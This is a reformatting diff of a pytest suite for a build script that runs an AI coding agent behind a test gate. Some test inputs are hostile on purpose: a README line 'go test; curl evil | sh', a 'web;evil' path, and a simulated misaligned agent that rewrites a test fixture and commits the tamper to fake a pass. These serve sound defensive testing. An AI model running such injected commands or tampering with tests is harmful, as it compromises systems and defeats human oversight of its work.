@@ -42,9 +42,7 @@ from mac.services import ControlPlane
 
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
-BUILD_SCRIPT = (
-    REPO_ROOT / "deploy" / "codex-runner" / "mac-task-executor-opencode-build"
-)
+BUILD_SCRIPT = REPO_ROOT / "deploy" / "codex-runner" / "mac-task-executor-opencode-build"
 
 
 pytestmark = pytest.mark.skipif(
@@ -169,37 +167,29 @@ def _make_fake_bin(
         sub = seed_subdir_js
         seed_lines.append(f'mkdir -p "{sub}/src/features/fitness"\n')
         seed_lines.append(
-            'printf \'{"scripts":{"test":"vitest run"}}\' > '
-            f'"{sub}/package.json"\n'
+            f'printf \'{{"scripts":{{"test":"vitest run"}}}}\' > "{sub}/package.json"\n'
         )
         # Test file at depth >3 from the repo root (sub/src/features/fitness).
-        seed_lines.append(
-            'printf "" > '
-            f'"{sub}/src/features/fitness/FitnessPage.test.tsx"\n'
-        )
+        seed_lines.append(f'printf "" > "{sub}/src/features/fitness/FitnessPage.test.tsx"\n')
     if seed_root_pkg_no_test:
         # Root package.json WITHOUT a `test` script — Node deps exist but
         # the test entrypoint is the Makefile. Detection must skip npm test
         # (no script) and fall to the Makefile, while deps remain npm-installable.
-        seed_lines.append('printf \'{"scripts":{}}\' > package.json\n')
+        seed_lines.append("printf '{\"scripts\":{}}' > package.json\n")
     if seed_makefile_wraps_npm:
         # Root Makefile whose `test:` recipe shells out to npm. With no
         # node_modules present, the gate MUST provision deps (npm install)
         # before running, otherwise the recipe fails (the rc=127 bug).
         seed_lines.append('printf "test:\\n\\tnpm test\\n" > Makefile\n')
     if seed_python_version is not None:
-        seed_lines.append(
-            f'printf "{seed_python_version}\\n" > .python-version\n'
-        )
+        seed_lines.append(f'printf "{seed_python_version}\\n" > .python-version\n')
     if seed_requires_python is not None:
         seed_lines.append(
             'printf "[project]\\nname = \\"x\\"\\n'
             f'requires-python = \\"{seed_requires_python}\\"\\n" > pyproject.toml\n'
         )
     if seed_unknown_test_cmd is not None:
-        seed_lines.append(
-            f'printf "Run tests with: {seed_unknown_test_cmd}\\n" > README.md\n'
-        )
+        seed_lines.append(f'printf "Run tests with: {seed_unknown_test_cmd}\\n" > README.md\n')
 
     # opencode: only `run` matters; `--version` returns a banner.
     oc_out = bindir / "_opencode_stdout.txt"
@@ -222,7 +212,7 @@ def _make_fake_bin(
         f"{git_state_line}"
         f'  cat "{oc_out}"\n'
         f'  cat "{oc_err}" >&2\n'
-        f'  exit {opencode_rc}\n'
+        f"  exit {opencode_rc}\n"
         "fi\n"
         "exit 0\n",
     )
@@ -230,9 +220,7 @@ def _make_fake_bin(
     # Fake pytest: emits canned output and exits with test_rc.
     _write_exec(
         bindir / "pytest",
-        "#!/usr/bin/env bash\n"
-        f"printf '%s' {json.dumps(test_output)}\n"
-        f"exit {test_rc}\n",
+        f"#!/usr/bin/env bash\nprintf '%s' {json.dumps(test_output)}\nexit {test_rc}\n",
     )
 
     # Fake uv: records `venv --python <ver>` calls to _uv_calls.txt and
@@ -247,48 +235,48 @@ def _make_fake_bin(
         "#!/usr/bin/env bash\n"
         f'echo "$@" >> {uv_calls}\n'
         'case "$1" in\n'
-        '  venv)\n'
+        "  venv)\n"
         '    target=".venv"\n'
-        '    # last non-flag arg may be the venv path; default .venv\n'
+        "    # last non-flag arg may be the venv path; default .venv\n"
         '    for a in "$@"; do case "$a" in --*|venv) ;; *) target="$a";; esac; done\n'
         '    mkdir -p "$target/bin"\n'
-        f'    cat > "$target/bin/pytest" <<\'WRAP\'\n'
-        f'#!/usr/bin/env bash\n'
-        f'echo PROVISIONED_VENV\n'
-        f'printf %s {json.dumps(test_output)}\n'
-        f'exit {test_rc}\n'
-        f'WRAP\n'
+        f"    cat > \"$target/bin/pytest\" <<'WRAP'\n"
+        f"#!/usr/bin/env bash\n"
+        f"echo PROVISIONED_VENV\n"
+        f"printf %s {json.dumps(test_output)}\n"
+        f"exit {test_rc}\n"
+        f"WRAP\n"
         '    chmod +x "$target/bin/pytest"\n'
         '    echo "Using CPython"\n'
-        '    ;;\n'
+        "    ;;\n"
         '  pip) echo "installed" ;;\n'
-        '  *) : ;;\n'
-        'esac\n'
+        "  *) : ;;\n"
+        "esac\n"
         "exit 0\n",
     )
     # Fake cargo: `test` fails rc=127 until .mac-provisioned exists. The
     # provisioning agent fallback is what creates that marker, so a green
     # run proves the fallback ran AND the gate re-judged the real command.
-    _cargo_ok = json.dumps("test result: ok. 3 passed\\n")  # extracted: no backslash inside an f-string expression (py3.11 compat, requires-python >=3.11)
+    _cargo_ok = json.dumps(
+        "test result: ok. 3 passed\\n"
+    )  # extracted: no backslash inside an f-string expression (py3.11 compat, requires-python >=3.11)
     _write_exec(
         bindir / "cargo",
         "#!/usr/bin/env bash\n"
         'if [ "$1" = "test" ]; then\n'
-        '  if [ -f .mac-provisioned ]; then\n'
+        "  if [ -f .mac-provisioned ]; then\n"
         f'    printf "%s" {_cargo_ok}\n'
-        '    exit 0\n'
-        '  fi\n'
+        "    exit 0\n"
+        "  fi\n"
         '  echo "error: linker cc not found" >&2\n'
-        '  exit 127\n'
-        'fi\n'
-        'exit 0\n',
+        "  exit 127\n"
+        "fi\n"
+        "exit 0\n",
     )
     # Fake ruff: lint detector picks this when seed_lint is set.
     _write_exec(
         bindir / "ruff",
-        "#!/usr/bin/env bash\n"
-        'echo "ruff check output"\n'
-        f"exit {lint_rc}\n",
+        f'#!/usr/bin/env bash\necho "ruff check output"\nexit {lint_rc}\n',
     )
 
     # Fake npm: `install` creates node_modules (marking that deps were
@@ -300,21 +288,21 @@ def _make_fake_bin(
         "#!/usr/bin/env bash\n"
         'sub="$1"\n'
         'case "$sub" in\n'
-        '  install)\n'
-        '    mkdir -p node_modules\n'
+        "  install)\n"
+        "    mkdir -p node_modules\n"
         '    echo "added 1 package"\n'
-        '    exit 0\n'
-        '    ;;\n'
-        '  test)\n'
-        '    if [ -d node_modules ]; then\n'
+        "    exit 0\n"
+        "    ;;\n"
+        "  test)\n"
+        "    if [ -d node_modules ]; then\n"
         f'      printf "%s" {json.dumps(test_output)}\n'
-        f'      exit {test_rc}\n'
-        '    fi\n'
+        f"      exit {test_rc}\n"
+        "    fi\n"
         '    echo "sh: vitest: not found" >&2\n'
-        '    exit 127\n'
-        '    ;;\n'
-        '  *) exit 0 ;;\n'
-        'esac\n',
+        "    exit 127\n"
+        "    ;;\n"
+        "  *) exit 0 ;;\n"
+        "esac\n",
     )
 
     # Fake make: `make test` reads the Makefile's recipe and runs it. We
@@ -323,11 +311,7 @@ def _make_fake_bin(
     # which runs recipes in the Makefile's directory).
     _write_exec(
         bindir / "make",
-        "#!/usr/bin/env bash\n"
-        'if [ "$1" = "test" ]; then\n'
-        '  exec npm test\n'
-        'fi\n'
-        'exit 0\n',
+        '#!/usr/bin/env bash\nif [ "$1" = "test" ]; then\n  exec npm test\nfi\nexit 0\n',
     )
 
     files = changed_files if changed_files is not None else ["a.txt", "b.txt"]
@@ -380,8 +364,8 @@ def _make_fake_bin(
             'case "$1" in\n'
             '  init|sync) mkdir -p "${2:-.}/.codegraph"; echo "indexed" ;;\n'
             '  affected) cat >/dev/null; echo "{\\"affected\\":[]}" ;;\n'
-            '  *) : ;;\n'
-            'esac\n'
+            "  *) : ;;\n"
+            "esac\n"
             f"exit {codegraph_rc}\n",
         )
 
@@ -412,7 +396,7 @@ def _make_fake_bin(
         # Last arg is the URL.
         'url="${@: -1}"\n'
         'case "$url" in\n'
-        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
+        f"  *\"/tasks/\"*) cat <<'JSON'\n{task_json}\nJSON\n;;\n"
         "  *) : ;;\n"
         "esac\n"
         "exit 0\n",
@@ -539,11 +523,7 @@ def test_k8s_executor_rejects_invalid_contract_remote_without_leaking_secret(
     bindir = tmp_path / "bin"
     redaction_marker = "test-only-redaction-marker"
     credential_url = (
-        "https://"
-        + "operator:"
-        + redaction_marker
-        + "@"
-        + "github.com/NVIDIA-dev/ova.git"
+        "https://" + "operator:" + redaction_marker + "@" + "github.com/NVIDIA-dev/ova.git"
     )
     _make_fake_bin(
         bindir,
@@ -579,11 +559,7 @@ def test_k8s_executor_rejects_invalid_contract_remote_without_leaking_secret(
     [
         {},
         {"MAC_OPENSHELL_SANDBOX": "1"},
-        {
-            "MAC_READ_ONLY_REPORT_PROCESS_ISOLATION": (
-                "separate_pid_namespace_v1"
-            )
-        },
+        {"MAC_READ_ONLY_REPORT_PROCESS_ISOLATION": ("separate_pid_namespace_v1")},
         {"MAC_TASK_GIT_TOKEN": "must-not-leak"},
     ],
 )
@@ -635,6 +611,7 @@ def test_legacy_executor_rejects_read_only_report_before_clone_or_agent(
 
 def test_captures_stdout_stderr_head_tail_and_event_summary(tmp_path: Path) -> None:
     bindir = tmp_path / "bin"
+
     # Build a JSON-lines stream using the REAL opencode event shapes:
     # `tool_use` events carry the tool name + status + error under
     # `part.state`; `step_finish` carries its reason under `part.reason`.
@@ -677,9 +654,7 @@ def test_captures_stdout_stderr_head_tail_and_event_summary(tmp_path: Path) -> N
             {
                 "model": "inference-hub/aws/anthropic/bedrock-claude-opus-4-8",
                 "agent": {
-                    "build": {
-                        "model": "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
-                    }
+                    "build": {"model": "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"}
                 },
             }
         )
@@ -691,9 +666,9 @@ def test_captures_stdout_stderr_head_tail_and_event_summary(tmp_path: Path) -> N
         manifest_path=manifest_path,
         opencode_config_path=cfg,
     )
-    assert manifest_path.exists(), (
-        "executor must write a manifest; stdout=%s stderr=%s"
-        % (result.stdout, result.stderr)
+    assert manifest_path.exists(), "executor must write a manifest; stdout=%s stderr=%s" % (
+        result.stdout,
+        result.stderr,
     )
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     findings = _findings_by_kind(manifest)
@@ -728,18 +703,9 @@ def test_captures_stdout_stderr_head_tail_and_event_summary(tmp_path: Path) -> N
     assert summary["final_step_finish_reason"] == "stop"
 
     # selected model recorded.
-    assert (
-        manifest["opencode_model"]
-        == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
-    )
-    assert (
-        manifest["llm_model"]
-        == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
-    )
-    assert (
-        manifest["llm"]["model"]
-        == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
-    )
+    assert manifest["opencode_model"] == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
+    assert manifest["llm_model"] == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
+    assert manifest["llm"]["model"] == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
 
 
 def test_records_original_and_effective_returncode_on_no_change(
@@ -813,9 +779,7 @@ def test_successful_push_and_pr_records_pr_and_full_files(tmp_path: Path) -> Non
     manifest_path = tmp_path / "mac-evidence.json"
     result = _run_build(bindir=bindir, manifest_path=manifest_path)
 
-    assert result.returncode == 0, (
-        "stdout=%s stderr=%s" % (result.stdout, result.stderr)
-    )
+    assert result.returncode == 0, "stdout=%s stderr=%s" % (result.stdout, result.stderr)
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     assert manifest["returncode"] == 0
     findings = _findings_by_kind(manifest)
@@ -836,8 +800,7 @@ def test_ordinary_retry_uses_distinct_lease_scoped_task_branches(
         bindir = tmp_path / lease_id / "bin"
         _make_fake_bin(
             bindir,
-            opencode_stdout=json.dumps({"type": "step_finish", "reason": "stop"})
-            + "\n",
+            opencode_stdout=json.dumps({"type": "step_finish", "reason": "stop"}) + "\n",
             task_record_id=task_id,
         )
         manifest_path = tmp_path / lease_id / "mac-evidence.json"
@@ -853,9 +816,7 @@ def test_ordinary_retry_uses_distinct_lease_scoped_task_branches(
             result.stdout,
             result.stderr,
         )
-        branch = (
-            "mac/mac-worker-python-coder-opencode/%s-%s" % (task_id, lease_id)
-        )
+        branch = "mac/mac-worker-python-coder-opencode/%s-%s" % (task_id, lease_id)
         branches.append(branch)
         git_calls = (bindir / "_git_calls.txt").read_text(encoding="utf-8")
         assert "checkout -b %s" % branch in git_calls
@@ -897,9 +858,7 @@ def test_gate_blocks_push_and_mr_when_tests_fail(tmp_path: Path) -> None:
     result = _run_build(bindir=bindir, manifest_path=manifest_path)
 
     # Failing tests must fail the run so it is not submitted as complete.
-    assert result.returncode != 0, (
-        "test failure must block; stdout=%s" % result.stdout
-    )
+    assert result.returncode != 0, "test failure must block; stdout=%s" % result.stdout
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     assert manifest["returncode"] != 0
     assert manifest["gate_blocked"] is True
@@ -1052,7 +1011,7 @@ def test_gate_rejects_subdir_js_project_with_unsafe_path(tmp_path: Path) -> None
         make_change=True,
         push_rc=0,
         pr_rc=0,
-        seed_test_command=None,        # no root pyproject/package.json test
+        seed_test_command=None,  # no root pyproject/package.json test
         seed_subdir_js="web;evil",
         test_rc=0,
         test_output="should not run\n",
@@ -1146,7 +1105,8 @@ def test_gate_provisions_declared_python_version_via_uv(tmp_path: Path) -> None:
     )
 
     assert result.returncode == 0, "stdout=%s stderr=%s" % (
-        result.stdout, result.stderr,
+        result.stdout,
+        result.stderr,
     )
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     assert manifest["gate_verdict"] == "pass"
@@ -1191,7 +1151,8 @@ def test_resolve_python_version_picks_minimum_from_pep440_range(
     )
 
     assert result.returncode == 0, "stdout=%s stderr=%s" % (
-        result.stdout, result.stderr,
+        result.stdout,
+        result.stderr,
     )
     uv_calls = (bindir / "_uv_calls.txt").read_text(encoding="utf-8")
     assert "--python 3.11" in uv_calls or "--python=3.11" in uv_calls
@@ -1228,7 +1189,8 @@ def test_resolve_python_version_strict_greater_does_not_provision_excluded_bound
     )
 
     assert result.returncode == 0, "stdout=%s stderr=%s" % (
-        result.stdout, result.stderr,
+        result.stdout,
+        result.stderr,
     )
     uv_calls = (bindir / "_uv_calls.txt").read_text(encoding="utf-8")
     # Must NOT provision the strictly-excluded 3.11; must bump to 3.12.
@@ -1254,20 +1216,20 @@ def test_activate_python_rebuilds_venv_on_version_mismatch(tmp_path: Path) -> No
         f'echo "$@" >> "{uv_calls}"\n'
         'if [ "$1" = "venv" ]; then\n'
         '  ver=""; path=""\n'
-        '  while [ $# -gt 0 ]; do\n'
+        "  while [ $# -gt 0 ]; do\n"
         '    case "$1" in\n'
         '      --python) ver="$2"; shift 2 ;;\n'
         '      --python=*) ver="${1#--python=}"; shift ;;\n'
-        '      venv) shift ;;\n'
+        "      venv) shift ;;\n"
         '      *) path="$1"; shift ;;\n'
-        '    esac\n'
-        '  done\n'
+        "    esac\n"
+        "  done\n"
         '  mkdir -p "$path/bin"\n'
         '  printf "#!/bin/sh\\necho Python %s\\n" "$ver" > "$path/bin/python"\n'
         '  chmod +x "$path/bin/python"\n'
-        '  exit 0\n'
-        'fi\n'
-        'exit 0\n',
+        "  exit 0\n"
+        "fi\n"
+        "exit 0\n",
     )
     proj = tmp_path / "proj"
     proj.mkdir()
@@ -1339,7 +1301,9 @@ def test_resolve_node_version_finds_root_project_github_workflow(
     proj = tmp_path / "repo"
     wf = proj / ".github" / "workflows"
     wf.mkdir(parents=True)
-    (wf / "ci.yml").write_text("jobs:\n  build:\n    steps:\n      - uses: setup-node\n        with:\n          node-version: 20\n")
+    (wf / "ci.yml").write_text(
+        "jobs:\n  build:\n    steps:\n      - uses: setup-node\n        with:\n          node-version: 20\n"
+    )
     result = _run_helper(
         ["_validate_node_version", "_resolve_node_version"],
         f'_resolve_node_version "{proj}"',
@@ -1347,8 +1311,7 @@ def test_resolve_node_version_finds_root_project_github_workflow(
     )
     assert result.returncode == 0, "stderr=%s" % result.stderr
     assert result.stdout.strip() == "20", (
-        "root-project .github workflow node-version not resolved; got %r"
-        % result.stdout
+        "root-project .github workflow node-version not resolved; got %r" % result.stdout
     )
 
 
@@ -1371,8 +1334,7 @@ def test_resolve_node_version_finds_subdir_project_repo_root_workflow(
     )
     assert result.returncode == 0, "stderr=%s" % result.stderr
     assert result.stdout.strip() == "22", (
-        "subdir-project repo-root workflow node-version not resolved; got %r"
-        % result.stdout
+        "subdir-project repo-root workflow node-version not resolved; got %r" % result.stdout
     )
 
 
@@ -1387,8 +1349,13 @@ def test_detect_rejects_subdir_with_leading_dash(tmp_path: Path) -> None:
     (sub / "package.json").write_text('{"scripts":{"test":"vitest"}}')
     (sub / "a.test.ts").write_text("")
     result = _run_helper(
-        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
-         "_find_subdir_js_project", "gate_detect_test_command"],
+        [
+            "_with_timeout",
+            "_pkg_has_test_script",
+            "_dir_has_js_tests",
+            "_find_subdir_js_project",
+            "gate_detect_test_command",
+        ],
         f'gate_detect_test_command "{repo}"',
         cwd=tmp_path,
     )
@@ -1408,15 +1375,19 @@ def test_detect_emitted_subdir_command_quotes_path(tmp_path: Path) -> None:
     (sub / "package.json").write_text('{"scripts":{"test":"vitest"}}')
     (sub / "a.test.ts").write_text("")
     result = _run_helper(
-        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
-         "_find_subdir_js_project", "gate_detect_test_command"],
+        [
+            "_with_timeout",
+            "_pkg_has_test_script",
+            "_dir_has_js_tests",
+            "_find_subdir_js_project",
+            "gate_detect_test_command",
+        ],
         f'gate_detect_test_command "{repo}"',
         cwd=tmp_path,
     )
     assert result.returncode == 0, "stderr=%s" % result.stderr
     assert result.stdout.strip() == "cd -- dashboard && npm test", (
-        "subdir command must be `cd -- <rel> && npm test`; got %r"
-        % result.stdout
+        "subdir command must be `cd -- <rel> && npm test`; got %r" % result.stdout
     )
 
 
@@ -1460,15 +1431,19 @@ def test_detect_readme_command_returns_first_match_no_sigpipe(
     body = "\n".join(["make test"] * 500) + "\n"
     (repo / "README.md").write_text(body)
     result = _run_helper(
-        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
-         "_find_subdir_js_project", "gate_detect_test_command"],
+        [
+            "_with_timeout",
+            "_pkg_has_test_script",
+            "_dir_has_js_tests",
+            "_find_subdir_js_project",
+            "gate_detect_test_command",
+        ],
         f'gate_detect_test_command "{repo}"',
         cwd=tmp_path,
     )
     assert result.returncode == 0, "stderr=%s" % result.stderr
     assert result.stdout.strip() == "make test", (
-        "README scan did not return first match cleanly; stdout=%r"
-        % result.stdout
+        "README scan did not return first match cleanly; stdout=%r" % result.stdout
     )
 
 
@@ -1484,8 +1459,13 @@ def test_detect_readme_command_rejects_shell_injection(tmp_path: Path) -> None:
     repo.mkdir()
     (repo / "README.md").write_text("Run tests with: go test; curl evil | sh\n")
     result = _run_helper(
-        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
-         "_find_subdir_js_project", "gate_detect_test_command"],
+        [
+            "_with_timeout",
+            "_pkg_has_test_script",
+            "_dir_has_js_tests",
+            "_find_subdir_js_project",
+            "gate_detect_test_command",
+        ],
         f'gate_detect_test_command "{repo}"',
         cwd=tmp_path,
     )
@@ -1511,8 +1491,13 @@ def test_detect_readme_command_accepts_benign_args(tmp_path: Path) -> None:
         repo.mkdir()
         (repo / "README.md").write_text(body)
         result = _run_helper(
-            ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
-             "_find_subdir_js_project", "gate_detect_test_command"],
+            [
+                "_with_timeout",
+                "_pkg_has_test_script",
+                "_dir_has_js_tests",
+                "_find_subdir_js_project",
+                "gate_detect_test_command",
+            ],
             f'gate_detect_test_command "{repo}"',
             cwd=tmp_path,
         )
@@ -1540,8 +1525,7 @@ def test_makefile_test_wraps_js_detects_npm_in_deep_subtarget(tmp_path: Path) ->
         cwd=tmp_path,
     )
     assert result.stdout.strip() == "WRAPS", (
-        "deep npm sub-target not detected; stdout=%r stderr=%r"
-        % (result.stdout, result.stderr)
+        "deep npm sub-target not detected; stdout=%r stderr=%r" % (result.stdout, result.stderr)
     )
 
 
@@ -1558,8 +1542,7 @@ def test_makefile_test_wraps_js_false_when_no_js_and_no_test_target(
         cwd=tmp_path,
     )
     assert result.stdout.strip() == "NO", (
-        "pure-Python Makefile wrongly flagged as JS-wrapping; stdout=%r"
-        % result.stdout
+        "pure-Python Makefile wrongly flagged as JS-wrapping; stdout=%r" % result.stdout
     )
 
 
@@ -1586,7 +1569,7 @@ def test_gate_prefers_subdir_js_over_makefile_when_both_present(tmp_path: Path) 
         # `test:` target that chains to sub-targets (npm is not on the
         # test: line itself — it's in test-dashboard sub-target).
         seed_test_command="pytest",
-        seed_makefile_wraps_npm=False,   # Makefile test: does NOT directly mention npm
+        seed_makefile_wraps_npm=False,  # Makefile test: does NOT directly mention npm
         # Subdir JS project with explicit test script.
         seed_subdir_js="dashboard",
         test_rc=0,
@@ -1606,12 +1589,12 @@ def test_gate_prefers_subdir_js_over_makefile_when_both_present(tmp_path: Path) 
         # seed Makefile with chained sub-targets (npm is in sub-target, not on test: line)
         '  printf "test: test-service test-dashboard\\ntest-service:\\n\\tuv run pytest\\ntest-dashboard:\\n\\tcd dashboard && npm test\\n" > Makefile\n'
         # seed dashboard/package.json with test script + deep test file
-        '  mkdir -p dashboard/src/features/fitness\n'
+        "  mkdir -p dashboard/src/features/fitness\n"
         '  printf \'{"scripts":{"test":"vitest run"}}\' > dashboard/package.json\n'
         '  printf "" > dashboard/src/features/fitness/FitnessPage.test.tsx\n'
         f'  cat "{bindir / "_opencode_stdout.txt"}"\n'
         f'  cat "{bindir / "_opencode_stderr.txt"}" >&2\n'
-        '  exit 0\n'
+        "  exit 0\n"
         "fi\n"
         "exit 0\n",
     )
@@ -1720,18 +1703,14 @@ def test_signed_manifest_with_rich_findings_passes_review_gate(
     readiness gate. Guards canonical-JSON drift between the bash
     json.dump heredoc and mac.models.json_dumps for the larger payload."""
     cp = ControlPlane.in_memory()
-    machine = cp.register_machine(
-        "opencode-host", resources={"cpu": 4, "memory_gb": 8}
-    )
+    machine = cp.register_machine("opencode-host", resources={"cpu": 4, "memory_gb": 8})
     worker = cp.register_agent(
         machine.id, "mac-worker-python-coder-opencode", capabilities=["python", "ops"]
     )
     attestation_key = getattr(worker, "attestation_key", None)
     assert attestation_key
 
-    task = cp.create_task(
-        "Build a widget", required_capabilities=["ops"], metadata={}
-    )
+    task = cp.create_task("Build a widget", required_capabilities=["ops"], metadata={})
     cp.claim_task(task.id, worker.id)
     cp.start_task(task.id, worker.id)
 
@@ -1756,9 +1735,7 @@ def test_signed_manifest_with_rich_findings_passes_review_gate(
         agent_id=worker.id,
         extra_env={"MAC_AGENT_ATTESTATION_KEY": attestation_key},
     )
-    assert result.returncode == 0, (
-        "stdout=%s stderr=%s" % (result.stdout, result.stderr)
-    )
+    assert result.returncode == 0, "stdout=%s stderr=%s" % (result.stdout, result.stderr)
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     assert manifest["signed_by"] == worker.id
     assert manifest["signature"].startswith("v1:")
@@ -1808,9 +1785,7 @@ def _git(args: List[str], cwd: Path, env: Optional[Dict[str, str]] = None) -> st
     ).stdout
 
 
-@pytest.mark.skipif(
-    shutil.which("git") is None, reason="git required for real-clone test"
-)
+@pytest.mark.skipif(shutil.which("git") is None, reason="git required for real-clone test")
 def test_agent_committed_branch_is_pushed_to_task_branch(tmp_path: Path) -> None:
     """The real production failure: an agentic model uses its bash tool to
     `git checkout -b <its-own-branch>` + commit, leaving the working tree
@@ -1879,7 +1854,7 @@ def test_agent_committed_branch_is_pushed_to_task_branch(tmp_path: Path) -> None
         "#!/usr/bin/env bash\n"
         'url="${@: -1}"\n'
         'case "$url" in\n'
-        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
+        f"  *\"/tasks/\"*) cat <<'JSON'\n{task_json}\nJSON\n;;\n"
         "  *) : ;;\n"
         "esac\n"
         "exit 0\n",
@@ -1904,17 +1879,18 @@ def test_agent_committed_branch_is_pushed_to_task_branch(tmp_path: Path) -> None
         manifest_path=manifest_path,
         task_id=task_id,
     )
-    assert manifest_path.exists(), (
-        "manifest missing; stdout=%s stderr=%s" % (result.stdout, result.stderr)
+    assert manifest_path.exists(), "manifest missing; stdout=%s stderr=%s" % (
+        result.stdout,
+        result.stderr,
     )
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     findings = _findings_by_kind(manifest)
     repo = findings["repo_change_summary"]
 
     expected_branch = "mac/mac-worker-python-coder-opencode/%s-lease-1" % task_id
-    assert repo["pushed"] is True, (
-        "agent-committed branch must be pushed; repo=%s stdout=%s"
-        % (repo, result.stdout)
+    assert repo["pushed"] is True, "agent-committed branch must be pushed; repo=%s stdout=%s" % (
+        repo,
+        result.stdout,
     )
     assert manifest["returncode"] == 0, (
         "run with real agent work must succeed; stdout=%s" % result.stdout
@@ -1954,7 +1930,7 @@ def test_review_feedback_is_included_in_prompt_with_shell_safety(tmp_path: Path)
         "#!/usr/bin/env bash\n"
         'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
         f'printf "%s\\n" "$@" > {captured}\n'
-        "printf '%s\\n' '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
+        'printf \'%s\\n\' \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
         "exit 0\n",
     )
     manifest_path = tmp_path / "mac-evidence.json"
@@ -1982,7 +1958,7 @@ def test_gate_agent_fallback_provisions_unknown_stack_then_gate_judges(
         make_change=True,
         push_rc=0,
         pr_rc=0,
-        seed_test_command=None,          # no pyproject/package.json
+        seed_test_command=None,  # no pyproject/package.json
         seed_unknown_test_cmd="cargo test",
     )
     # Override opencode: the build-phase `run` seeds the README that
@@ -2000,9 +1976,9 @@ def test_gate_agent_fallback_provisions_unknown_stack_then_gate_judges(
         '  printf "Run tests with: cargo test\\n" > README.md\n'
         '  prompt="$*"\n'
         '  case "$prompt" in\n'
-        '    *PROVISION-ONLY*) touch .mac-provisioned ;;\n'
-        '  esac\n'
-        "  echo '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
+        "    *PROVISION-ONLY*) touch .mac-provisioned ;;\n"
+        "  esac\n"
+        '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
         "  exit 0\n"
         "fi\n"
         "exit 0\n",
@@ -2016,7 +1992,8 @@ def test_gate_agent_fallback_provisions_unknown_stack_then_gate_judges(
     )
 
     assert result.returncode == 0, "stdout=%s stderr=%s" % (
-        result.stdout, result.stderr,
+        result.stdout,
+        result.stderr,
     )
     manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
     assert manifest["gate_verdict"] == "pass"
@@ -2052,7 +2029,7 @@ def test_gate_agent_fallback_cannot_fake_a_pass(tmp_path: Path) -> None:
         'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
         'if [ "$1" = "run" ]; then\n'
         '  printf "Run tests with: cargo test\\n" > README.md\n'
-        "  echo '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
+        '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
         "  exit 0\n"
         "fi\n"
         "exit 0\n",
@@ -2075,9 +2052,7 @@ def test_gate_agent_fallback_cannot_fake_a_pass(tmp_path: Path) -> None:
     assert repo.get("pr_opened") is False
 
 
-@pytest.mark.skipif(
-    shutil.which("git") is None, reason="git required for reset-hard guard test"
-)
+@pytest.mark.skipif(shutil.which("git") is None, reason="git required for reset-hard guard test")
 def test_gate_provision_agent_test_edits_are_reverted(tmp_path: Path) -> None:
     """A malicious/misaligned PROVISION-ONLY agent edits a tracked test file
     to force `cargo test` green. The source-edit guard (git reset --hard to
@@ -2112,8 +2087,8 @@ def test_gate_provision_agent_test_edits_are_reverted(tmp_path: Path) -> None:
         'if [ "$1" = "test" ]; then\n'
         '  if grep -q PASS gate_marker 2>/dev/null; then echo "ok"; exit 0; fi\n'
         '  echo "test failed" >&2; exit 1\n'
-        'fi\n'
-        'exit 0\n',
+        "fi\n"
+        "exit 0\n",
     )
     # Malicious provisioning agent: edits the tracked gate_marker to PASS
     # (i.e. tampers with the test fixture) and commits it. The guard must
@@ -2124,36 +2099,40 @@ def test_gate_provision_agent_test_edits_are_reverted(tmp_path: Path) -> None:
         'if [ "$1" = "--version" ]; then echo "opencode test"; exit 0; fi\n'
         'if [ "$1" = "run" ]; then\n'
         '  case "$*" in\n'
-        '    *PROVISION-ONLY*)\n'
-        '      echo PASS > gate_marker\n'
-        '      git add -A >/dev/null 2>&1\n'
-        '      git -c user.name=a -c user.email=a@a commit -m tamper >/dev/null 2>&1\n'
-        '      ;;\n'
-        '    *)\n'
-        '      # Build phase: make a benign tracked change so the script\n'
-        '      # reaches the gate (WORK_REF exists). This change is part of\n'
-        '      # the pre-provision HEAD snapshot, so the guard preserves it;\n'
-        '      # only the later PROVISION-ONLY tamper is reverted.\n'
+        "    *PROVISION-ONLY*)\n"
+        "      echo PASS > gate_marker\n"
+        "      git add -A >/dev/null 2>&1\n"
+        "      git -c user.name=a -c user.email=a@a commit -m tamper >/dev/null 2>&1\n"
+        "      ;;\n"
+        "    *)\n"
+        "      # Build phase: make a benign tracked change so the script\n"
+        "      # reaches the gate (WORK_REF exists). This change is part of\n"
+        "      # the pre-provision HEAD snapshot, so the guard preserves it;\n"
+        "      # only the later PROVISION-ONLY tamper is reverted.\n"
         '      printf "build phase edit\\n" >> README.md\n'
-        '      ;;\n'
-        '  esac\n'
+        "      ;;\n"
+        "  esac\n"
         '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
-        '  exit 0\n'
+        "  exit 0\n"
         "fi\n"
         "exit 0\n",
     )
-    task_json = json.dumps({
-        "task": {
-            "title": "x", "description": "x", "project": "demo",
